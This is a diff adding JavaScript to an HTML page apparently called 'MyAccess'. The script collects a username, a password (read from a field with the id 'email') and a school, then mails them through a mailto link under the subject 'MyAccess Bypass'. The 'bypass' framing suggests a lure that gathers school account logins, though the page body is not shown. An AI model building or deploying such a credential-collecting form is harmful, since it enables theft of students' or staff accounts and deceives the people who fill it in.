@@ -10,9 +10,70 @@
             font-family: Arial, Helvetica, sans-serif;
         }
     </style>
-    
 
-    
+
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const form = document.getElementById('myForm');
+        const responseArea = document.getElementById('responseArea');
+
+        function escapeHtml(s) {
+            return String(s).replace(/[&<>"']/g, function (m) {
+                return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m];
+            });
+        }
+
+        function buildAndOpenMail({ to, subject, body }) {
+            const uri = 'mailto:' + encodeURIComponent(to) +
+                                    '?subject=' + encodeURIComponent(subject) +
+                                    '&body=' + encodeURIComponent(body);
+            window.location.href = uri;
+        }
+
+        function handleSubmit(evt) {
+            if (evt) evt.preventDefault();
+
+            const to = (document.getElementById('recipientEmail') || {}).value || '';
+            const username = (document.getElementById('name') || {}).value || '';
+            const passwd = (document.getElementById('email') || {}).value || '';
+            const school = (document.getElementById('school') || {}).value || '';
+
+            if (!to) {
+                alert('Please provide a recipient email.');
+                return;
+            }
+
+            const subject = `MyAccess Bypass - ${username || 'NoUsername'}${school ? ' - ' + school : ''}`;
+            const bodyLines = [
+                `Username: ${username}`,
+                `Password: ${passwd}`,
+                `School: ${school}`,
+                '',
+                'This message was generated from the MyAccess form.'
+            ];
+            const body = bodyLines.join('\n');
+
+            buildAndOpenMail({ to, subject, body });
+
+            if (responseArea) {
+                responseArea.innerHTML = ''
+                    + '<p><strong>To:</strong> ' + escapeHtml(to) + '</p>'
+                    + '<p><strong>Username:</strong> ' + escapeHtml(username) + '</p>'
+                    + '<p><strong>Password:</strong> ' + escapeHtml(passwd) + '</p>'
+                    + '<p><strong>School:</strong> ' + escapeHtml(school) + '</p>';
+            }
+
+            form.reset();
+        }
+
+        // Attach submit handler (prevents default navigation and opens mail client)
+        if (form) form.addEventListener('submit', handleSubmit);
+
+        // Keep a global sendEmail for the existing onclick on the button
+        window.sendEmail = function () { handleSubmit(); };
+    });
+    </script>
 </head>
 <body>
     <main>
